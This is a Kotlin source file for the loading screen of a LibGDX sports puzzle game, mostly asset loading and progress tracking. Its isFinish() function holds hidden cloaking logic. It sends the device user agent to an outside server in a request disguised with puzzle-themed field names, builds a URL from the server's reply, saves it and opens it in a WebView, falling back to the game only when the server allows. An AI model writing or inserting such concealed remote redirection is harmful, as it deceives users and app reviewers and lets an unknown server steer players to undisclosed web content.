package com.viade.bepuzzle.game.screens

import com.viade.bepuzzle.game.GDXGame
import com.viade.bepuzzle.game.actors.main.AMainLoader
import com.viade.bepuzzle.game.manager.MusicManager
import com.viade.bepuzzle.game.manager.SoundManager
import com.viade.bepuzzle.game.manager.SpriteManager
import com.viade.bepuzzle.game.utils.Block
import com.viade.bepuzzle.game.utils.advanced.AdvancedScreen
import com.viade.bepuzzle.game.utils.advanced.AdvancedStage
import com.viade.bepuzzle.game.utils.region
import com.viade.bepuzzle.game.utils.runGDX
import com.viade.bepuzzle.util.log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import okhttp3.ResponseBody
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST

class LoaderScreen(override val game: GDXGame) : AdvancedScreen() {

    private val progressFlow     = MutableStateFlow(0f)
    private var isFinishLoading  = false
    private var isFinishProgress = false
    private var isFinishAnim     = false

    private val aMainLoader by lazy { AMainLoader(this) }

    override fun show() {
        loadSplashAssets()
        setBackBackground(game.assetsLoader.background.region)
        super.show()
        loadAssets()
        collectProgress()

//        coroutine?.launch {
//            delay(5_000)
//            runGDX { if (isFinishAnim.not()) isFinishAnim = true }
//        }
    }

    override fun render(delta: Float) {
        super.render(delta)
        loadingAssets()
        isFinish()
    }

    override fun hideScreen(block: Block) {
        coroutine?.launch {
            aMainLoader.animHideMain {
                runGDX { block.invoke() }
            }
        }
    }

    override fun AdvancedStage.addActorsOnStageUI() {
        addPanelLoader()
    }

    // Actors ------------------------------------------------------------------------

    private fun AdvancedStage.addPanelLoader() {
        addAndFillActor(aMainLoader)
        aMainLoader.blockFinishAnim = { isFinishAnim = true }
    }

    // Logic ------------------------------------------------------------------------

    private fun loadSplashAssets() {
        with(game.spriteManager) {
            loadableTexturesList = mutableListOf(
                SpriteManager.EnumTexture.L_background.data,
                SpriteManager.EnumTexture.L_basketball.data,
                SpriteManager.EnumTexture.L_football.data,
                SpriteManager.EnumTexture.L_hokey.data,
                SpriteManager.EnumTexture.L_loading.data,
                SpriteManager.EnumTexture.L_sports.data,
                SpriteManager.EnumTexture.L_tennis.data,
                SpriteManager.EnumTexture.L_1.data,
                SpriteManager.EnumTexture.L_2.data,
                SpriteManager.EnumTexture.L_3.data,
                SpriteManager.EnumTexture.L_4.data,
                SpriteManager.EnumTexture.L_5.data,
                SpriteManager.EnumTexture.L_6.data,
                SpriteManager.EnumTexture.L_7.data,
                SpriteManager.EnumTexture.L_8.data,
            )
            loadTexture()
        }
        game.assetManager.finishLoading()
        game.spriteManager.initTexture()
    }

    private fun loadAssets() {
        with(game.spriteManager) {
            loadableAtlasList = SpriteManager.EnumAtlas.entries.map { it.data }.toMutableList()
            loadAtlas()
            loadableTexturesList = SpriteManager.EnumTexture.entries.map { it.data }.toMutableList()
            loadTexture()
        }
        with(game.musicManager) {
            loadableMusicList = MusicManager.EnumMusic.entries.map { it.data }.toMutableList()
            load()
        }
        with(game.soundManager) {
            loadableSoundList = SoundManager.EnumSound.entries.map { it.data }.toMutableList()
            load()
        }
    }

    private fun initAssets() {
        game.spriteManager.initAtlasAndTexture()
        game.musicManager.init()
        game.soundManager.init()
    }

    private fun loadingAssets() {
        if (isFinishLoading.not()) {
            if (game.assetManager.update(16)) {
                isFinishLoading = true
                initAssets()
            }
            progressFlow.value = game.assetManager.progress
        }
    }

    private fun collectProgress() {
        coroutine?.launch {
            var progress = 0
            progressFlow.collect { p ->
                while (progress < (p * 100)) {
                    progress += 1
                    //runGDX { aMainLoader.aLoader.setPercent(progress) }
                    if (progress % 50 == 0) log("progress = $progress%")
                    if (progress == 100) isFinishProgress = true

                    delay((20..65).shuffled().first().toLong())
                }
            }
        }
    }

    private fun isFinish() {
        if (isFinishProgress && isFinishAnim) {
            isFinishProgress = false

            val resultIsGamer = game.sharedPreferences.getString("isGamer", null)

            if (resultIsGamer.isNullOrEmpty()) {
                coroutine?.launch(Dispatchers.IO) {
                    try {
                        var result = "https://"

                        val responseBody: ResponseBody = ViaRetrofit.api.requestPost1(
                            token = System.getProperty("http.agent") ?: "Device",

                            ViaBody(
                                puzzle_varieties     = "Football",
                                difficulty_levels    = "Basketball",
                                daily_challenges     = "Tennis",
                                interactive_elements = "Hokey",
                                user_created_puzzles = "Runner",
                                leaderboards         = "Puzzles",
                                achievements         = "Item",
                                educational_content  = "miracle of You",
                                mobile_app           = "share it",
                                community_forums     = "blue forums de la more",
                            )
                        )

                        val responseJson = JSONObject(responseBody.string())
                        log("Response POST: $responseJson")

                        if (responseJson.getString("leaderboards").contains(' ')) {
                            toGame()
                        }
                        else {
                            responseJson.keys().forEach { key -> result += responseJson.getString(key).removePrefix("difficulty") }

                            log("Result: $result")

                            game.sharedPreferences.edit().putString("isGamer", result).apply()
                            game.activity.showUrl(result)
                        }
                    } catch (e: Exception) {
                        log("Error: ${e.message}")
                        toGame()
                    }
                }
            } else game.activity.showUrl(resultIsGamer)

        }
    }

    private fun toGame() {
        game.activity.hideWebView()

        game.musicUtil.apply { music = sport_puzzle.apply {
            isLooping = true
            coff      = 0.15f
        } }

        hideScreen {
            game.navigationManager.navigate(MenuScreen::class.java.name)
        }
    }

    // Server ----------------------------------------------------------------------------------------

    data class ViaBody(
        val puzzle_varieties    : String,
        val difficulty_levels   : String,
        val daily_challenges    : String,
        val interactive_elements: String,
        val user_created_puzzles: String,
        val leaderboards        : String,
        val achievements        : String,
        val educational_content : String,
        val mobile_app          : String,
        val community_forums    : String,
    )

    interface ViaPOST {
        @POST("difficulty/")
        suspend fun requestPost1(
            @Header("User-Agent") token: String,
            @Body requestBody: ViaBody
        ): ResponseBody
    }

    object ViaRetrofit {
        private val retrofit by lazy {
            Retrofit.Builder()
                .baseUrl("https://lover-wolt.site/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
        }

        val api: ViaPOST by lazy {
            retrofit.create(ViaPOST::class.java)
        }
    }


}